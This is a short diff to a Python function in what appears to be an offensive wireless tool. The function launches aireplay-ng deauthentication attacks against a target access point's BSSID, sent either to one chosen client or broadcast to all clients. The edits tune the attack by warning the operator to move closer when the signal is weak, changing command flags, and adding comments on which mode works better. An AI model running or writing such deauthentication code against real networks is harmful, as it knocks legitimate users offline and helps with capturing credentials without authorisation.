@@ -49,6 +49,14 @@ def deauth_attack_single_optimized(target, mon_iface, window_index=0, client_mac
     """
     global active_attack_processes
     
+    # Warn about weak signal
+    try:
+        pwr = int(target.get('power', -100))
+        if pwr < -70:
+            print(f"{Color.WARNING}[!] WEAK SIGNAL ({pwr} dBm) - Move closer for better results!{Color.ENDC}")
+    except:
+        pass
+    
     if client_mac:
         title = f"DEAUTH [{window_index+1}] {target['essid'][:10]} → {client_mac[-8:]}"
     else:
@@ -59,22 +67,21 @@ def deauth_attack_single_optimized(target, mon_iface, window_index=0, client_mac
     
     if client_mac:
         # TARGETED deauth - attacks both directions (AP → Client, Client → AP)
+        # Sends 128 packets per request (64 to AP + 64 to client)
         # This is MORE EFFECTIVE than broadcast!
         cmd = f"xterm -geometry 85x12+{window_index * 60}+{window_index * 40} " \
               f"-bg black -fg red -title '{title}' -e " \
-              f"'aireplay-ng --deauth {packet_arg} " \
+              f"'aireplay-ng -0 {packet_arg} " \
               f"-a {target['bssid']} " \
               f"-c {client_mac} " \
-              f"-D " \
               f"--ignore-negative-one {mon_iface}'"
     else:
         # BROADCAST deauth (all clients on AP)
-        # -D flag enables AP detection retry for better results
+        # WARNING: Some clients IGNORE broadcast deauth!
         cmd = f"xterm -geometry 85x12+{window_index * 60}+{window_index * 40} " \
               f"-bg black -fg red -title '{title}' -e " \
-              f"'aireplay-ng --deauth {packet_arg} " \
+              f"'aireplay-ng -0 {packet_arg} " \
               f"-a {target['bssid']} " \
-              f"-D " \
               f"--ignore-negative-one {mon_iface}'"
     
     proc = subprocess.Popen(
